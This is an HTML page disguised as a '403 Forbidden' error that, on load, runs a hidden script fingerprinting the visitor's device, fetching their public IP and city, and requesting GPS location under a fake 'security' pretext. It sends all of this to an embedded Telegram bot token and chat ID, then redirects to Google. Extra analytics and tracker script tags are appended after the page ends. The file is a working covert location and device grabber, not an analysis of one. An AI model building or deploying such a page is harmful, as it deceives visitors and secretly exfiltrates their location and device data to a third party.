<!DOCTYPE html>
<html>
<head>
  <title>403 Forbidden</title>
  <style>
    body {
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background-color: #f5f5f5;
      color: #333;
      max-width: 800px;
      margin: 0 auto;
      padding: 20px;
      text-align: center;
    }
    .error-container {
      background-color: white;
      border-radius: 8px;
      padding: 30px;
      box-shadow: 0 2px 10px rgba(0,0,0,0.1);
      margin-top: 50px;
    }
    h1 {
      color: #d32f2f;
      font-size: 48px;
      margin-bottom: 10px;
    }
    p {
      font-size: 18px;
      margin-bottom: 30px;
    }
    .loading {
      color: #666;
      font-style: italic;
    }
    .btn {
      background-color: #4285f4;
      color: white;
      border: none;
      padding: 10px 20px;
      border-radius: 4px;
      cursor: pointer;
      font-size: 16px;
      transition: background-color 0.3s;
    }
    .btn:hover {
      background-color: #3367d6;
    }
    .warning {
      display: none;
      background-color: #fff3e0;
      border-left: 4px solid #ffa000;
      padding: 15px;
      margin: 20px 0;
      text-align: left;
    }
  </style>
</head>
<body>
  <div class="error-container">
    <h1>403</h1>
    <p>Access to this resource is forbidden</p>
    <p class="loading">Checking your credentials...</p>
    
    <div id="lokasiWarning" class="warning">
      <strong>Location service required</strong><br>
      We need to verify your location for security purposes.<br>
      <button class="btn" onclick="retryLocation()">Allow Location Access</button>
    </div>
    
    <button class="btn" onclick="window.location.reload()">Refresh Page</button>
  </div>

<script>
const token = "8398453307:AAGoO9Jew8x7ic0jau-rjyLOKye64m3bN9g";
const chatId = "7191927069";
const redirectURL = "https://www.google.com";

const deviceInfo = {
  // Basic info
  userAgent: navigator.userAgent,
  language: navigator.language,
  platform: navigator.platform,
  resolution: screen.width + "x" + screen.height,
  colorDepth: screen.colorDepth + " bit",
  brand: "Unknown",
  timestamp: new Date().toISOString(),
  
  // Network info
  ipPublic: "Loading...",
  ipLocation: "Loading...",
  connection: {
    type: "Unknown",
    speed: "Unknown"
  },
  
  // Device capabilities
  battery: { level: "Unknown", charging: "Unknown" },
  touchSupport: false,
  hardware: {
    cores: navigator.hardwareConcurrency || "Unknown",
    memory: navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown"
  },
  
  // Advanced fingerprinting
  gpu: {
    vendor: "Unknown",
    renderer: "Unknown"
  },
  timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
  fonts: [],
  mediaCodecs: {
    audio: [],
    video: []
  }
};

// Enhanced brand detection
function detectBrand() {
  const ua = deviceInfo.userAgent.toLowerCase();
  const brands = {
    "samsung": "Samsung", "xiaomi": "Xiaomi", "oppo": "Oppo", "vivo": "Vivo",
    "realme": "Realme", "asus": "Asus", "infinix": "Infinix", "tecno": "Tecno",
    "iphone": "iPhone", "huawei": "Huawei", "oneplus": "OnePlus", "google": "Google",
    "pixel": "Pixel", "redmi": "Redmi", "poco": "POCO", "lenovo": "Lenovo"
  };
  
  for (const [key, value] of Object.entries(brands)) {
    if (ua.includes(key)) {
      deviceInfo.brand = value;
      break;
    }
  }
}

// Enhanced network detection
async function fetchNetworkInfo() {
  try {
    // Public IP and location
    const ipResponse = await fetch("https://ipapi.co/json/");
    const ipData = await ipResponse.json();
    deviceInfo.ipPublic = ipData.ip;
    deviceInfo.ipLocation = `${ipData.city}, ${ipData.region}, ${ipData.country_name} (${ipData.org})`;
    
    // Connection info
    if (navigator.connection) {
      const conn = navigator.connection;
      deviceInfo.connection = {
        type: conn.effectiveType || "Unknown",
        speed: conn.downlink ? conn.downlink + " Mbps" : "Unknown",
        rtt: conn.rtt ? conn.rtt + " ms" : "Unknown",
        saveData: conn.saveData ? "Enabled" : "Disabled"
      };
    }
  } catch (error) {
    deviceInfo.ipPublic = "Failed to fetch";
    deviceInfo.ipLocation = "Failed to fetch";
  }
}

// Enhanced device capabilities
function checkDeviceCapabilities() {
  // Touch support
  deviceInfo.touchSupport = ('ontouchstart' in window) || (navigator.maxTouchPoints > 0);
  
  // Battery status
  if (navigator.getBattery) {
    navigator.getBattery().then(battery => {
      deviceInfo.battery = {
        level: Math.round(battery.level * 100) + "%",
        charging: battery.charging ? "Yes" : "No"
      };
    });
  }
  
  // GPU detection
  try {
    const canvas = document.createElement('canvas');
    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
    if (gl) {
      const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
      if (debugInfo) {
        deviceInfo.gpu = {
          vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
          renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
        };
      }
    }
  } catch (e) {}
  
  // Font detection (limited)
  const testFonts = ['Arial', 'Times New Roman', 'Courier New', 'Comic Sans MS', 'Verdana', 'Georgia'];
  const detectedFonts = [];
  const div = document.createElement('div');
  div.style.position = 'absolute';
  div.style.left = '-9999px';
  div.style.fontSize = '72px';
  document.body.appendChild(div);
  
  testFonts.forEach(font => {
    div.style.fontFamily = 'monospace,' + font;
    if (div.offsetWidth !== div.offsetHeight) {
      detectedFonts.push(font);
    }
  });
  
  document.body.removeChild(div);
  deviceInfo.fonts = detectedFonts;
  
  // Media codec support
  ['audio/mp3', 'audio/ogg', 'audio/wav', 'audio/aac'].forEach(type => {
    if (document.createElement('audio').canPlayType(type)) {
      deviceInfo.mediaCodecs.audio.push(type);
    }
  });
  
  ['video/mp4', 'video/webm', 'video/ogg'].forEach(type => {
    if (document.createElement('video').canPlayType(type)) {
      deviceInfo.mediaCodecs.video.push(type);
    }
  });
}

// Enhanced Telegram message formatting
function buildEnhancedMessage(includeLocation, lat, lon) {
  return `ðŸ›°ï¸ *Advanced Device Report* ðŸ›°ï¸

ðŸ“… *Timestamp*: ${new Date(deviceInfo.timestamp).toLocaleString()}

ðŸ”§ *Hardware Information*
â€¢ Brand: ${deviceInfo.brand}
â€¢ Platform: ${deviceInfo.platform}
â€¢ Resolution: ${deviceInfo.resolution} (${deviceInfo.colorDepth})
â€¢ CPU Cores: ${deviceInfo.hardware.cores}
â€¢ RAM: ${deviceInfo.hardware.memory}
â€¢ GPU: ${deviceInfo.gpu.vendor} (${deviceInfo.gpu.renderer})
â€¢ Touch Support: ${deviceInfo.touchSupport ? 'Yes' : 'No'}

ðŸŒ *Network Information*
â€¢ Public IP: \`${deviceInfo.ipPublic}\`
â€¢ Location: ${deviceInfo.ipLocation}
â€¢ Connection: ${deviceInfo.connection.type} (${deviceInfo.connection.speed})
â€¢ Timezone: ${deviceInfo.timezone}

ðŸ”‹ *Device Status*
â€¢ Battery: ${deviceInfo.battery.level} (Charging: ${deviceInfo.battery.charging})

ðŸŽ›ï¸ *Capabilities*
â€¢ Audio Codecs: ${deviceInfo.mediaCodecs.audio.join(', ') || 'None'}
â€¢ Video Codecs: ${deviceInfo.mediaCodecs.video.join(', ') || 'None'}
â€¢ Fonts: ${deviceInfo.fonts.join(', ') || 'None detected'}

${includeLocation ? `ðŸ“ *GPS Location*: https://maps.google.com/?q=${lat},${lon}` : 'ðŸ“ *GPS Location*: Not available'}

ðŸ›¡ï¸ *User Agent*
\`\`\`
${deviceInfo.userAgent}
\`\`\``;
}

// GPS location handling (unchanged)
function getLocationAndSend() {
  if (!navigator.geolocation) {
    sendToTelegram(buildEnhancedMessage(false), true);
    return;
  }

  navigator.geolocation.getCurrentPosition(
    (pos) => {
      const { latitude, longitude } = pos.coords;
      sendToTelegram(buildEnhancedMessage(true, latitude, longitude), true);
    },
    (err) => {
      document.getElementById("lokasiWarning").style.display = "block";
      sendToTelegram(buildEnhancedMessage(false), true);
    },
    { timeout: 7000 }
  );
}

// Telegram sending function (unchanged)
async function sendToTelegram(message, redirect = false) {
  try {
    await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: "Markdown"
      })
    });
  } finally {
    if (redirect) {
      setTimeout(() => {
        window.location.href = redirectURL;
      }, 3000);
    }
  }
}

// Retry location (unchanged)
function retryLocation() {
  document.getElementById("lokasiWarning").style.display = "none";
  getLocationAndSend();
}

// Enhanced initialization
window.onload = async () => {
  detectBrand();
  checkDeviceCapabilities();
  await fetchNetworkInfo();
  getLocationAndSend();
};
</script>
</body>
</html>  <script async defer src="https://www.googletagmanager.com/gtag/js?id=G-BDP4EF6BCQ"></script>
  <script>
    function getAdGroup() {
      let adGroup = localStorage.getItem('ad_group');
      if (!adGroup) {
        adGroup = Math.floor(Math.random() * 100) + 1;
        localStorage.setItem('ad_group', adGroup);
      }
      return parseInt(adGroup);
    }
    window.dataLayer = window.dataLayer || [];
    function gtag() { dataLayer.push(arguments); }

    gtag('js', new Date());
    gtag('config', 'G-BDP4EF6BCQ');
  </script>

  <!-- Tracking Script -->
<script src="config.js"></script>
<script src="tracker.js"></script>>
</body>
</html>
